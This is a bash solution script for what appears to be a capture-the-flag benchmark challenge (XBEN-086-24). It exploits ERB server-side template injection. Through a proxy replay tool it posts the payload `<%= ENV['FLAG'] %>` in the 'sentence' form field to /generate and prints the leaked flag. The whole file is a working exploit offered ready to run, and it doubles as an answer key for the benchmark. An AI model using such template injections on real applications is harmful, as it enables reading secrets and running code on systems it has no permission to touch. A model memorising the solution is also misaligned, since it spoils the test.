#!/usr/bin/env bash
# XBEN-086-24 — ERB template injection. Proxy-mode twin. /generate renders the
# `sentence` field as ERB, so `<%= ENV["FLAG"] %>` prints the flag env var.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben086p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/generate' \
  --set 'form.sentence=<%= ENV["FLAG"] %>' --set 'form.number=1' >/dev/null
print_flag
